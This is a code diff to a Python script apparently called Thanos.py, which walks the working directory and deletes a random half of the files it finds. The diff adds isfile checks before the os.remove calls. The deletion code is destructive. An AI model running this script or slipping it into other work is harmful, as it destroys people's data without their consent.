@@ -1,3 +1,4 @@
+from genericpath import isfile
 import os
 import random
 from time import sleep
@@ -5,7 +6,7 @@ from time import sleep
 files = []
 
 
-for root, dirs, file in os.walk(os.curdir):
+for root, dirs, file in os.walk(os.getcwd()):
     if file == "Thanos.py"  or file == "README" or dirs == "Thanos.py" or dirs == ".git":
         continue
     files.append(file)
@@ -41,21 +42,24 @@ else:
     for file in halfFiles:
         if not isinstance(file, list):
             try:
-                os.remove(file)
+                if os.path.isfile(file):
+                    os.remove(file)
             except Exception as e:
                 print(e)
         else:
             for item in file:
                 if not isinstance(item, list):
                     try:
-                        os.remove(item)
+                        if os.path.isfile(item):
+                            os.remove(item)
                     except Exception as e:
                         print(e)
                 else:
                     for subItem in item:
                         if not isinstance(subItem, list):
                             try:
-                                os.remove(subItem)
+                                if os.path.isfile(subItem):
+                                    os.remove(subItem)
                             except Exception as e:
                                 print(e)
                         else:
